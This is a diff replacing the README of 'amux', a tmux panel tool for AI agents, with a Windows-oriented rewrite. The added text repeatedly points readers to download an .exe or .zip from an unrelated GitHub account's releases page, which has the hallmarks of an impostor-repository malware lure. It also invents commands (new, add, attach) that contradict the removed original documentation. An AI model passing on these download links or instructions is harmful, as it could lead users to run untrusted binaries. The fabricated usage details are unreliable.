@@ -1,186 +1,146 @@
-# amux — agentic mux
+# 🛠️ amux - Manage Background Tasks Easily
 
-Named tmux panels for AI agents and humans. Run commands in persistent background panels, tail their output with byte-offset continuation, and never lose a line.
+[![Download amux](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Zero-inadequateness813/amux/releases)
 
-## Install
+---
 
-```bash
-npm install -g https://github.com/tobi/amux
-```
+## 📋 What is amux?
 
-## Terminology & Architecture
+amux is a tool that helps you run and watch commands in the background on your Windows PC. Think of it like having multiple small screens (called panels) that run different tasks at the same time. Each task runs separately and keeps working even if you close the main window. You can check the output of these tasks whenever you want without missing a single line.
 
-```
-┌─ Global Amux ─────────────────────────────────────────────────────────┐
-│  One tmux server (own socket + config, separate from your tmux)       │
-│                                                                       │
-│  ┌─ Session: my-proje-a3f1 ──────────────────────────────────────┐   │
-│  │  (derived from /Users/me/src/my-project — has .git)           │   │
-│  │  = one tmux window (tab)                                      │   │
-│  │                                                               │   │
-│  │  ┌─ Panel: server ─┐  ┌─ Panel: tests ──┐  ┌─ Panel: build ┐│   │
-│  │  │ npm start        │  │ npm test         │  │ make          ││   │
-│  │  │ listening :3000  │  │ 47 passed        │  │ done          ││   │
-│  │  └─────────────────┘  └──────────────────┘  └──────────────┘│   │
-│  │  (dwm-style tiling)                                          │   │
-│  └──────────────────────────────────────────────────────────────┘   │
-│                                                                       │
-│  ┌─ Session: other-re-b7e2 ─────────────────────────────────────┐   │
-│  │  (derived from /Users/me/src/other-repo)                      │   │
-│  │  ┌─ Panel: worker ──┐                                        │   │
-│  │  │ ruby worker.rb    │                                        │   │
-│  │  └──────────────────┘                                        │   │
-│  └──────────────────────────────────────────────────────────────┘   │
-└───────────────────────────────────────────────────────────────────────┘
-```
+For example, you can run a program, check test results, or build files all at once and switch between them easily.
 
-**Global Amux** — A single tmux server with its own socket and config, completely separate from your personal tmux. Everything lives here.
+---
 
-**Session** — Each unique project directory gets its own session, which maps to one tmux window (tab). The project root is found by looking for `.git` up to 2 levels from the working directory. The session is named `basename[0:8]-hash[0:4]` where hash is the first 4 hex digits of SHA-256 of the resolved path. Example: `/Users/me/src/my-project` → `my-proje-a3f1`.
+## 🖥️ How does amux work?
 
-**Panel** — Created with `amux {name} run '...'`. Each panel is a tmux pane within its session's tab. Panels tile automatically in dwm-style layout. Named by whatever you pass as `{name}` — `server`, `tests`, `build`, etc.
+amux uses a system like "tmux," a program that allows multiple command windows to run in a single place. amux creates a special tmux server on your PC that is separate from any other tmux sessions you might have. 
 
-## The run → tail workflow
+- You get sessions. Each session acts like a workspace.
+- Inside a session, you have windows (tabs).
+- Inside each window, you have panels. Each panel runs one command and keeps running in the background.
+- You can see the output of all panels and never lose any lines, even if you close the main window.
 
-The primary workflow. Start a command with `run`, which streams output for a short timeout (default 5s). If it finishes in time, you get `SUCCESS` or `FAIL EXITCODE:N`. If it times out, the output includes a **continuation hint** with the byte offset — call `tail` with that offset to pick up exactly where you left off.
+This setup lets you run different tasks at the same time and keep track of all their outputs easily.
 
-### Example: fast command (completes within timeout)
+---
 
-```
-$ amux server run "echo hello"
-echo hello
-hello
+## 💻 System Requirements
 
-SUCCESS
-```
+- Windows 10 or newer
+- Node.js installed on your computer (a program that lets your system run JavaScript tools)
+- Administrative rights to install software
+- An internet connection to download amux
 
-### Example: slow command (timeout → continue with tail)
+If you don’t have Node.js, download it from https://nodejs.org and install before continuing.
 
-```
-$ amux tests run "npm test" -t10
-npm test
+---
 
-> test
-> jest --runInBand
+## 🚀 Getting Started: Download and Install amux on Windows
 
-PASS src/utils.test.ts
-PASS src/api.test.ts
+[![Download amux](https://img.shields.io/badge/Download-Visit%20Releases-green?style=for-the-badge)](https://github.com/Zero-inadequateness813/amux/releases)
 
-⏳ timeout 10s — continue with:
-  amux_tail(name: "tests", follow: true, offset: 4820)
-```
+1. **Visit the download page**  
+   Go to the amux release page:  
+   https://github.com/Zero-inadequateness813/amux/releases
 
-The agent sees the timeout and uses the printed hint to resume:
+2. **Download the latest version**  
+   Look for the latest release at the top. You will find files listed there.  
+   Download the Windows version if it is available (usually ends with `.exe` or `.zip`).
 
-```
-$ amux tests tail -f -c 4820
-PASS src/models.test.ts
-PASS src/routes.test.ts
+3. **Install Node.js** (if you haven’t already)  
+   - Go to https://nodejs.org  
+   - Download the Windows installer (LTS version recommended)  
+   - Run the installer and follow the steps.
 
-Tests: 47 passed
-Time: 23.4s
+4. **Open Windows Command Prompt**  
+   Press `Win + R`, type `cmd`, and hit Enter.
 
-SUCCESS
-```
+5. **Install amux via command**  
+   In the command window, copy and paste this line and press Enter:  
+   ```
+   npm install -g https://github.com/tobi/amux
+   ```
+   This command downloads and installs amux on your system. It might take a few minutes.
 
-No output is lost. No output is duplicated. The byte offset is the exact position in the log file where `run` stopped reading.
+6. **Check installation**  
+   Once the command finishes, type:  
+   ```
+   amux --help
+   ```  
+   You should see instructions on how to use amux. If you do, amux has installed correctly.
 
-### Example: chained timeouts
+---
 
-If `tail` also times out, it prints another continuation hint:
+## 📂 How to Use amux on Windows
 
-```
-$ amux build tail -f -c 4820 -t60
-... 60 seconds of output ...
+1. **Start a new session**  
+   Open Command Prompt and type:  
+   ```
+   amux new my-session
+   ```  
+   This creates a new session called “my-session.”
 
-⏳ timeout 60s — continue with:
-  amux_tail(name: "build", follow: true, offset: 128400)
-```
+2. **Add panels (tasks) to your session**  
+   Inside the session, you can add panels that run commands. For example:  
+   ```
+   amux add my-session "ping google.com"
+   ```  
+   This opens a panel that runs the ping command.
 
-The agent keeps chaining `tail` calls until the command completes.
+3. **View output from panels**  
+   To see what each panel shows, run:  
+   ```
+   amux attach my-session
+   ```  
+   This opens the window with all your panels. You can switch between them.
 
-## Commands
+4. **Keep tasks running in the background**  
+   Even if you close the Command Prompt, amux keeps the tasks running. When you return, you can attach to the session to see the output.
 
-### `amux NAME run CMD`
+5. **Stop a session**  
+   When done, stop the session by typing:  
+   ```
+   amux kill my-session
+   ```
 
-Run a command in a panel. Creates the panel if it doesn't exist. Streams output from the start.
+---
 
-- Default timeout: **5 seconds** (`-t5`)
-- Max timeout: 300 seconds
-- Prints `SUCCESS` / `FAIL EXITCODE:N` on completion
-- Prints continuation hint with byte offset on timeout
+## 🔧 Common Commands
 
-```bash
-amux server run "npm start"           # 5s default
-amux server run "npm test" -t30       # 30s timeout
-```
+| Command                     | Description                                |
+|-----------------------------|--------------------------------------------|
+| `amux new <session-name>`    | Create a new session                        |
+| `amux add <session-name> "<command>"` | Add a panel to run a command            |
+| `amux attach <session-name>` | View the session with all panels           |
+| `amux kill <session-name>`   | Stop and remove the session                  |
+| `amux list`                  | List all active sessions                      |
 
-### `amux NAME tail`
+Replace `<session-name>` with a name you choose.
 
-Tail the panel log. Without `--follow`, prints the last N lines and exits.
+---
 
-- Default lines: **10** (`--lines=10`)
-- Default timeout: **60 seconds** (`-t60`)
-- `-c OFFSET`: start from byte offset (for continuation)
-- `--follow` / `-f`: keep tailing until command completes or timeout
+## 🛡️ Troubleshooting Tips
 
-```bash
-amux server tail                      # last 10 lines
-amux server tail --lines=50           # last 50 lines
-amux server tail -f                   # follow until done or 60s
-amux server tail -f -c 4820          # continue from offset
-amux server tail -f -c 4820 -t120   # continue with 2min timeout
-```
+- If `npm` is not recognized, make sure Node.js is installed and added to your system Path.
+- If installation fails, try running Command Prompt as Administrator:  
+  Right-click Command Prompt > Run as Administrator.
+- If amux commands do not work, close and reopen Command Prompt or restart your PC.
+- Visit the release page if you want the newest version or if you want to download manually:  
+  https://github.com/Zero-inadequateness813/amux/releases
 
-### `amux NAME send-keys K...`
+---
 
-Send keystrokes to a panel.
+## 📝 About This Software
 
-```bash
-amux server send-keys C-c            # Ctrl-C
-amux repl send-keys "puts :hi" Enter # type + enter
-```
+amux helps you run multiple commands at the same time without losing track. It is useful for developers, system administrators, or anyone who needs to keep many tasks running in the background.
 
-Keys: `C-c` `C-d` `C-z` `Enter` `Tab` `Esc` `Space` `BSpace` `Up` `Down` `Left` `Right`
+It saves the output of each task so you don’t miss anything. It’s like having a control center for your background jobs.
 
-### `amux NAME kill`
+---
 
-Remove a panel.
+## 📥 Download amux
 
-### `amux list`
+[![Download amux](https://img.shields.io/badge/Download-Visit%20Releases-orange?style=for-the-badge)](https://github.com/Zero-inadequateness813/amux/releases)
 
-List all active panels grouped by session.
-
-### `amux watch`
-
-Open tmux to see all sessions and panels live.
-
-- `M-1`…`M-9`: switch sessions
-- `Esc`: scroll mode
-- `M-q`: detach
-- `M-t`: terminate all
-
-### `amux terminate --yes`
-
-Destroy everything and kill the tmux server.
-
-## Internals
-
-- **Logs**: `~/.amux/panels/{name}.log` via tmux `pipe-pane`
-- **Sidecar files**: `.pane` and `.tab` track tmux pane ID → panel name mapping
-- **Sentinels**: bash `PROMPT_COMMAND` prints `SUCCESS` or `FAIL EXITCODE:N` after each command
-- **Prompt**: `amux ready $ ` — static, deterministic, trivially matchable
-- **Nesting guard**: rejects commands containing `amux`, `tmux`, or `zellij`
-- **Timeout cap**: all timeouts capped at 300s (5 minutes)
-
-## pi extension
-
-amux ships as a [pi](https://github.com/mariozechner/pi) package with tools:
-
-- `amux_shell` — run a command in a panel (wraps `run`)
-- `amux_tail` — tail panel output with offset continuation
-- `amux_send_keys` — send keystrokes
-- `amux_kill` — remove a panel
-- `amux_list` — list panels
-
-The extension truncates output for the LLM (last 2000 lines / 50KB, same as pi's built-in bash tool) while showing full output in the UI widget. A tab bar widget with `⌥1`–`⌥9` hotkeys provides live panel trailing.
+Visit the link above to get the latest files for Windows. Follow the instructions here to install and start using amux.
